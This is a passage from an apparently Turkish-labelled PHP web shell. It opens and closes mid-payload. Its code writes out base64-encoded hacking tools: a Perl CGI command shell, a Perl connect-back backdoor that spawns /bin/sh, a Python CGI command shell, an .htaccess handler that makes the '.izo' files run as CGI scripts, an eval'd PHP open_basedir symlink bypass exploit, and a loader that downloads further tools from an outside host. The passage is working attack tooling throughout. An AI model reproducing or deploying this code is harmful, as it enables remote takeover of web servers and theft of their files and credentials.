YW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkkVHJh
bnNmZXJGaWxlID1+IG0hKFteL15cXF0qKSQhOw0KCSRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQx
Ow0KDQoJJFRhcmdldEZpbGVTaXplID0gbGVuZ3RoKCRpbnsnZmlsZWRhdGEnfSk7DQoJIyBpZiB0
aGUgZmlsZSBleGlzdHMgYW5kIHdlIGFyZSBub3Qgc3VwcG9zZWQgdG8gb3ZlcndyaXRlIGl0DQoJ
aWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQoJew0KCQlwcmlu
dCAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KCX0NCgll
bHNlICMgZmlsZSBpcyBub3QgcHJlc2VudA0KCXsNCgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRU
YXJnZXROYW1lIikpDQoJCXsNCgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOw0KCQkJ
cHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307DQoJCQljbG9zZShVUExPQURGSUxFKTsN
CgkJCXByaW50ICJUcmFuc2ZlcmVkICRUYXJnZXRGaWxlU2l6ZSBCeXRlcy48YnI+IjsNCgkJCXBy
aW50ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQlw
cmludCAiRmFpbGVkOiAkITxicj4iOw0KCQl9DQoJfQ0KCXByaW50ICIiOw0KCSZQcmludENvbW1h
bmRMaW5lSW5wdXRGb3JtOw0KDQoJJlByaW50UGFnZUZvb3RlcjsNCn0NCg0KIy0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRz
IHRvIGRvd25sb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGVuYW1lIGlzIG5vdCBzcGVjaWZpZWQs
IGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmls
ZSwgb3RoZXJ3aXNlIGl0IGRpc3BsYXlzIGEgbWVzc2FnZSB0byB0aGUgdXNlciBhbmQgcHJvdmlk
ZXMgYSBsaW5rDQojIHRocm91Z2ggIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLg0K
Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIERvd25sb2FkRmlsZQ0Kew0KCSMgaWYgbm8gZmls
ZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5z
ZmVyRmlsZSBlcSAiIikNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsNCgkJJlByaW50Rmls
ZURvd25sb2FkRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgkJcmV0dXJuOw0KCX0NCgkNCgkj
IGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJ
aWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQoJCSghJFdpbk5U
ICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJ
JFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2
ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikg
PX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsN
Cgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0K
CXsNCgkJJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhh
dmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCSZQcmludERvd25sb2FkTGlua1Bh
Z2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBNYWlu
IFByb2dyYW0gLSBFeGVjdXRpb24gU3RhcnRzIEhlcmUNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0N
CiZSZWFkUGFyc2U7DQomR2V0Q29va2llczsNCg0KJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NS
SVBUX05BTUUnfTsNCiRTZXJ2ZXJOYW1lID0gJEVOVnsnU0VSVkVSX05BTUUnfTsNCiRMb2dpblBh
c3N3b3JkID0gJGlueydwJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmls
ZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCg0KJEFjdGlvbiA9ICRpbnsnYSd9
Ow0KJEFjdGlvbiA9ICJsb2dpbiIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNp
ZmllZCwgdXNlIGRlZmF1bHQNCg0KIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3aGljaCB0aGUgY29t
bWFuZHMgd2lsbCBiZSBleGVjdXRlZA0KJEN1cnJlbnREaXIgPSAkaW57J2QnfTsNCmNob3AoJEN1
cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCg0KJExvZ2dlZElu
ID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOw0KDQppZigkQWN0aW9uIGVxICJs
b2dpbiIgfHwgISRMb2dnZWRJbikgIyB1c2VyIG5lZWRzL2hhcyB0byBsb2dpbg0Kew0KCSZQZXJm
b3JtTG9naW47DQoNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImNvbW1hbmQiKSAjIHVzZXIgd2FudHMg
dG8gcnVuIGEgY29tbWFuZA0Kew0KCSZFeGVjdXRlQ29tbWFuZDsNCn0NCmVsc2lmKCRBY3Rpb24g
ZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlDQp7DQoJJlVwbG9hZEZp
bGU7DQp9DQplbHNpZigkQWN0aW9uIGVxICJkb3dubG9hZCIpICMgdXNlciB3YW50cyB0byBkb3du
bG9hZCBhIGZpbGUNCnsNCgkmRG93bmxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAibG9n
b3V0IikgIyB1c2VyIHdhbnRzIHRvIGxvZ291dA0Kew0KCSZQZXJmb3JtTG9nb3V0Ow0KfQ==';

$file = fopen("izo.cin" ,"w+");
$write = fwrite ($file ,base64_decode($cgishellizocin));
fclose($file);
� � chmod("izo.cin",0755);
$netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hh
MHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQog
ICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQo
MSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAg
ICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1Zb
MV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJb
Kl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3An
KSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZf
SU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAg
ICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNF
UlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgi
VW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmlu
ZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+
JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl
bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu
ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE
YXRhY2hlZFxuXG4iOw==';

$file = fopen("dc.pl" ,"w+");
$write = fwrite ($file ,base64_decode($netcatshell));
fclose($file);
� � chmod("dc.pl",0755);
� �echo "<iframe src=cgitelnet1/izo.cin width=100% height=100%
frameborder=0></iframe> ";
break;
case "PHP_7":

� � mkdir('python', 0755);
� � chdir('python');
� � � � $kokdosya = ".htaccess";
� � � � $dosya_adi = "$kokdosya";
� � � � $dosya = fopen ($dosya_adi , 'w') or die ("Dosya
a&#231;&#305;lamad&#305;!");
� � � � $metin = "AddHandler cgi-script .izo";
� � � � fwrite ( $dosya , $metin ) ;
� � � � fclose ($dosya);
$pythonp = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBB
IHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBD
b3B5cmlnaHQgTWljaGFlbCBGb29yZAojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQg
cmVsaWNlbnNlIHRoaXMgY29kZS4KCiMgTm8gd2FycmFudHkgZXhwcmVzcyBvciBpbXBsaWVkIGZv
ciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMg
Y29kZS4uLi4KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISEKCiMgRS1tYWlsIG1pY2hhZWwgQVQg
Zm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsv
YXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbAoKIiIiCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8g
ZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLgoiIiIKIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIEltcG9ydHMKdHJ5
OgogICAgaW1wb3J0IGNnaXRiOyBjZ2l0Yi5lbmFibGUoKQpleGNlcHQ6CiAgICBwYXNzCmltcG9y
dCBzeXMsIGNnaSwgb3MKc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQKZnJvbSB0aW1lIGltcG9ydCBz
dHJmdGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPCmZy
b20gdHJhY2ViYWNrIGltcG9ydCBwcmludF9leGMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRs
aW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQt
c2l6ZToxMnB0OyI+Jwp2ZXJzaW9uc3RyaW5nID0gJ1ZlcnNpb24gMS4wLjAgN3RoIEp1bHkgMjAw
NCcKCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToKICAgIHNjcmlwdG5hbWUg
PSBvcy5lbnZpcm9uWyJTQ1JJUFRfTkFNRSJdCmVsc2U6CiAgICBzY3JpcHRuYW1lID0gIiIKCk1F
VEhPRCA9ICciUE9TVCInCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxl
cwoKZGVmIGdldGZvcm0odmFsdWVsaXN0LCB0aGVmb3JtLCBub3RwcmVzZW50PScnKToKICAgICIi
IlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20g
aXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFs
dWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLgogICAgKGUu
Zy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0g
d2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3Npbmcg
aXNuJ3QuKSIiIgogICAgZGF0YSA9IHt9CiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0OgogICAg
ICAgIGlmIG5vdCB0aGVmb3JtLmhhc19rZXkoZmllbGQpOgogICAgICAgICAgICBkYXRhW2ZpZWxk
XSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3Jt
W2ZpZWxkXSkgIT0gdHlwZShbXSk6CiAgICAgICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IHRoZWZv
cm1bZmllbGRdLnZhbHVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB2YWx1ZXMg
PSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9y
IGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAg
ICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1z
aGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+
CjxIMT5XZWxjb21lIHRvIGNnaS1zaGVsbC5weSAtIDxCUj5hIFB5dGhvbiBDR0k8L0gxPgo8Qj48
ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPgoiIiIrZm9udGxpbmUgKyJWZXJzaW9uIDogIiArIHZl
cnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAs
ICVBICVkICVCLCAlWScpKycuPC9DRU5URVI+PEJSPicKCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIg
Q29tbWFuZDwvSDI+CjxGT1JNIE1FVEhPRD1cIiIiIiArIE1FVEhPRCArICciIGFjdGlvbj0iJyAr
IHNjcmlwdG5hbWUgKyAiIiJcIj4KPGlucHV0IG5hbWU9Y21kIHR5cGU9dGV4dD48QlI+CjxpbnB1
dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+CjwvRk9STT48QlI+PEJSPiIiIgpib2R5
ZW5kID0gJzwvQk9EWT48L0hUTUw+JwplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5n
IFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBtYWluIGJvZHkgb2YgdGhlIHNj
cmlwdAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHByaW50ICJDb250ZW50LXR5cGU6
IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyCiAg
ICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJs
YW5rIGxpbmUKICAgIGZvcm0gPSBjZ2kuRmllbGRTdG9yYWdlKCkKICAgIGRhdGEgPSBnZXRmb3Jt
KFsnY21kJ10sZm9ybSkKICAgIHRoZWNtZCA9IGRhdGFbJ2NtZCddCiAgICBwcmludCB0aGVmb3Jt
aGVhZAogICAgcHJpbnQgdGhlZm9ybQogICAgaWYgdGhlY21kOgogICAgICAgIHByaW50ICc8SFI+
PEJSPjxCUj4nCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJS
PicKICAgICAgICBwcmludCAnUmVzdWx0IDogPEJSPjxCUj4nCiAgICAgICAgdHJ5OgogICAgICAg
ICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkKICAgICAg
ICAgICAgY2hpbGRfc3RkaW4uY2xvc2UoKQogICAgICAgICAgICByZXN1bHQgPSBjaGlsZF9zdGRv
dXQucmVhZCgpCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpCiAgICAgICAgICAgIHBy
aW50IHJlc3VsdC5yZXBsYWNlKCdcbicsICc8QlI+JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlv
biwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNv
bW1hbmQKICAgICAgICAgICAgcHJpbnQgZXJyb3JtZXNzCiAgICAgICAgICAgIGYgPSBTdHJpbmdJ
TygpCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpCiAgICAgICAgICAgIGEgPSBmLmdldHZh
bHVlKCkuc3BsaXRsaW5lcygpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGE6CiAgICAgICAgICAg
ICAgICBwcmludCBsaW5lCgogICAgcHJpbnQgYm9keWVuZAoKCiIiIgpUT0RPL0lTU1VFUwoKCgpD
SEFOR0VMT0cKCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wCkEgdmVyeSBiYXNpYyBzeXN0
ZW0gZm9yIGV4ZWN1dGluZyBzaGVsbCBjb21tYW5kcy4KSSBtYXkgZXhwYW5kIGl0IGludG8gYSBw
cm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';

$file = fopen("python.izo" ,"w+");
$write = fwrite ($file ,base64_decode($pythonp));
fclose($file);
� � chmod("python.izo",0755);
� �echo "<iframe src=python/python.izo width=100% height=100%
frameborder=0></iframe> ";
break;
case "PHP_8":

$mode="cp";//????????????.
if($_REQUEST['bypass']!=$mode)
{
� �echo "<iframe src=cp width=100% height=100% frameborder=0></iframe> ";
exit;
}
eval(base64_decode("LyoNClBIUCA1LjIuMTEvNS4zLjAgc3ltbGluaygpIG9wZW5fYmFzZWRpciBieXBhc3MgDQpieSBN
YWtzeW1pbGlhbiBBcmNpZW1vd2ljeiBodHRwOi8vc2VjdXJpdHlyZWFzb24uY29tLw0KY3hpYiBb
IGEuVF0gc2VjdXJpdHlyZWFzb24gWyBkMHRdIGNvbQ0KDQpDSFVKV0FNV01VWkcNCiovDQoNCiRm
YWtlZGlyPSJjeCI7DQokZmFrZWRlcD0xNjsNCg0KJG51bT0wOyAvLyBvZmZzZXQgb2Ygc3ltbGlu
ay4kbnVtDQoNCmlmKCFlbXB0eSgkX0dFVFsnZmlsZSddKSkgJGZpbGU9JF9HRVRbJ2ZpbGUnXTsN
CmVsc2UgaWYoIWVtcHR5KCRfUE9TVFsnZmlsZSddKSkgJGZpbGU9JF9QT1NUWydmaWxlJ107DQpl
bHNlICRmaWxlPSIiOw0KDQplY2hvICc8UFJFPjxpbWcNCnNyYz0iaHR0cDovL3NlY3VyaXR5cmVh
c29uLmNvbS9nZngvbG9nby5naWY/Y3g1MjExLnBocCI+PFA+VGhpcyBpcyBleHBsb2l0DQpmcm9t
IDxhDQpocmVmPSJodHRwOi8vc2VjdXJpdHlyZWFzb24uY29tLyIgdGl0bGU9IlNlY3VyaXR5IEF1
ZGl0IFBIUCI+U2VjdXJpdHkgQXVkaXQNCkxhYiAtIFNlY3VyaXR5UmVhc29uPC9hPiBsYWJzLg0K
QXV0aG9yIDogTWFrc3ltaWxpYW4gQXJjaWVtb3dpY3oNCjxwPlNjcmlwdCBmb3IgbGVnYWwgdXNl
IG9ubHkuDQo8cD5QSFAgNS4yLjExIDUuMy4wIHN5bWxpbmsgb3Blbl9iYXNlZGlyIGJ5cGFzcw0K
PHA+TW9yZTogPGEgaHJlZj0iaHR0cDovL3NlY3VyaXR5cmVhc29uLmNvbS8iPlNlY3VyaXR5UmVh
c29uPC9hPg0KPHA+PGZvcm0gbmFtZT0iZm9ybSINCiBhY3Rpb249Ij9CYWNrQ29ubmVjdD1QSFBf
OCZieXBhc3M9Y3AiIG1ldGhvZD0icG9zdCI+PGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImZpbGUi
IHNpemU9IjUwIg0KdmFsdWU9IicuaHRtbHNwZWNpYWxjaGFycygkZmlsZSkuJyI+PGlucHV0IHR5
cGU9InN1Ym1pdCIgbmFtZT0iaHltIg0KdmFsdWU9IkNyZWF0ZSBTeW1saW5rIj48L2Zvcm0+JzsN
Cg0KaWYoZW1wdHkoJGZpbGUpKQ0KICAgIGV4aXQ7DQoNCmlmKCFpc193cml0YWJsZSgiLiIpKQ0K
ICAgIGRpZSgibm90IHdyaXRhYmxlIGRpcmVjdG9yeSIpOw0KDQokbGV2ZWw9MDsNCg0KZm9yKCRh
cz0wOyRhczwkZmFrZWRlcDskYXMrKyl7DQogICAgaWYoIWZpbGVfZXhpc3RzKCRmYWtlZGlyKSkN
CiAgICAgICAgbWtkaXIoJGZha2VkaXIpOw0KICAgIGNoZGlyKCRmYWtlZGlyKTsNCn0NCg0Kd2hp
bGUoMTwkYXMtLSkgY2hkaXIoIi4uIik7DQoNCiRoYXJkc3R5bGUgPSBleHBsb2RlKCIvIiwgJGZp
bGUpOw0KDQpmb3IoJGE9MDskYTxjb3VudCgkaGFyZHN0eWxlKTskYSsrKXsNCiAgICBpZighZW1w
dHkoJGhhcmRzdHlsZVskYV0pKXsNCiAgICAgICAgaWYoIWZpbGVfZXhpc3RzKCRoYXJkc3R5bGVb
JGFdKSkgDQogICAgICAgICAgICBta2RpcigkaGFyZHN0eWxlWyRhXSk7DQogICAgICAgIGNoZGly
KCRoYXJkc3R5bGVbJGFdKTsNCiAgICAgICAgJGFzKys7DQogICAgfQ0KfQ0KJGFzKys7DQp3aGls
ZSgkYXMtLSkNCiAgICBjaGRpcigiLi4iKTsNCg0KQHJtZGlyKCJmYWtlc3ltbGluayIpOw0KQHVu
bGluaygiZmFrZXN5bWxpbmsiKTsNCg0KQHN5bWxpbmsoc3RyX3JlcGVhdCgkZmFrZWRpci4iLyIs
JGZha2VkZXApLCJmYWtlc3ltbGluayIpOw0KDQovLyB0aGlzIGxvb3Agd2lsbCBza2lwIGFsbHJl
YWR5IGNyZWF0ZWQgc3ltbGlua3MuDQp3aGlsZSgxKQ0KICAgIGlmKHRydWU9PShAc3ltbGluaygi
ZmFrZXN5bWxpbmsvIi5zdHJfcmVwZWF0KCIuLi8iLCRmYWtlZGVwLTEpLiRmaWxlLA0KInN5bWxp
bmsiLiRudW0pKSkgYnJlYWs7DQogICAgZWxzZSAkbnVtKys7DQoNCkB1bmxpbmsoImZha2VzeW1s
aW5rIik7DQpta2RpcigiZmFrZXN5bWxpbmsiKTsNCg0KZGllKCc8Rk9OVCBDT0xPUj0iUkVEIj5j
aGVjayBzeW1saW5rIDxhDQpocmVmPSIuL3N5bWxpbmsnLiRudW0uJyI+c3ltbGluaycuJG51bS4n
PC9hPiBmaWxlPC9GT05UPicpOw=="));
break;
case "PHP_9":
� � mkdir('perltools', 0755);
� � chdir('perltools');
$perltoolss = 'PD9waHAKLyoKCiovCmVjaG8gIjxodG1sPjx0aXRsZT5JbXBvcnRlciBUMDBseiB2LjQ8L3RpdGxl
PjxoZWFkPjxMSU5LIFJFTD0nU0hPUlRDVVQgSUNPTidIUkVGPSdodHRwOi8vd3d3LmhhY2stYm9v
ay5uZXQvZmF2aWNvbi5pY28nPjwvaGVhZD4KPHN0eWxlPmE6bGluayB7dGV4dC1kZWNvcmF0aW9u
Om5vbmU7fWE6aG92ZXIgeyAgICAgYm9yZGVyLWJvdHRvbTogMXB4IGRvdHRlZCAjYmEwMDAwO31h
OnZpc2l0ZWQge3RleHQtZGVjb3JhdGlvbjpub25lO308L3N0eWxlPgo8Ym9keSB0ZXh0PScjRkYw
MDAwJyBiZ2NvbG9yPScjMDAwMDAwJyBsaW5rPScjQ0NDQ0NDJyB2bGluaz0nIzgwODA4MCcgYWxp
bms9JyM5OTk5OTknPjxkaXYgYWxpZ249J2NlbnRlcic+PGJyPgo8aW1nIGJvcmRlcj0nMCcgc3Jj
PSdodHRwOi8vdXBsb2FkLnRyYWlkbnQubmV0L3VwZmlsZXMvbzhJOTk4MTAucG5nJyB3aWR0aD0n
NTY2JyBoZWlnaHQ9JzI4Myc+PC9kaXY+Cjxmb250IGZhY2U9J3RhaG9tYScgc2l6ZT0nMicgY29s
b3I9JyNmMzAwMDAnPjxicj48Yj48IS0tIGhhY2stYm9vay5uZXQgLS0+IjsKQHNldF90aW1lX2xp
bWl0KDApOwpAZXJyb3JfcmVwb3J0aW5nKEVfQUxMIHwgRV9OT1RJQ0UpOwokeD1hcnJheSggImh0
LnR4dCI9PiIuaHRhY2Nlc3MiLCAiY2dpLW5ldy50eHQiPT4iY2dpLnIxeiIsICJkby1uZXcudHh0
Ij0+ImRvbWFpbi5yMXoiLCAidXNlci50eHQiPT4idXNlci5yMXoiLCAiY28udHh0Ij0+ImNvbmZp
Zy5yMXoiLCAic3ltLnR4dCI9PiJzeW1saW5rLnIxeiIsICJzcWwtbmV3LnR4dCI9PiJzcWwucGhw
IiwgInI1Ny50eHQiPT4icjU3LnBocCIsICJjcGFuZWwudHh0Ij0+ImNwYW5lbC5waHAiLCAiZG9t
YWlucy10eHQudHh0Ij0+ImRvbWFpbi5waHAiLCAiam9vbWxhLnR4dCI9PiJqb29tbGEucGhwIiwg
IndwLnR4dCI9PiJ3cC5waHAiLCAiY29uZmlnLXBocC50eHQiPT4iY29uZmlnLnBocCIsICJpbmku
dHh0Ij0+ImluaS5waHAiLCAidmIudHh0Ij0+InZiLnBocCIsICJpc3N3LnR4dCI9PiJpc3N3LnBo
cCIsICJwbnB4LWluaS50eHQiPT4icGhwLmluaSIsICk7CmZvcmVhY2goJHggYXMgJGQ9PiR6KXsg
JGZpbGUgPSBmb3BlbigkeiAsIncrIik7CiRyMHg9ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly93
d3cubXVzaWM0ZnVuLm9yZy9yMHgzZC9yMHgvJy4kZCk7CiR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUg
LCRyMHgpOwpmY2xvc2UoJGZpbGUpOwppZigkd3JpdGUpeyBlY2hvICJbK10gV3JpdGVkIDogPGEg
aHJlZj0nLi8keic+JHo8L2E+IDwvYnI+IjsKfWVsc2V7IGVjaG8gIlt+XSBDYW4ndCBXcml0ZSA6
ICR6IDxicj4iOwp9CmNobW9kKCR6ICwgMDc1NSk7Cn0KZWNobyAiPC9iPjwvZm9udD48Yj48Yj48
Zm9udCBmYWNlPSdUYWhvbWEnIHNpemU9JzInIGNvbG9yPScjQ0NDQ0NDJz48L2ZvbnQ+PC9iPjxm
b250IGZhY2U9J1RhaG9tYScgc2l6ZT0nMicgY29sb3I9JyM5OTk5OTknPjxiPjwvYj48IS0tIC9o
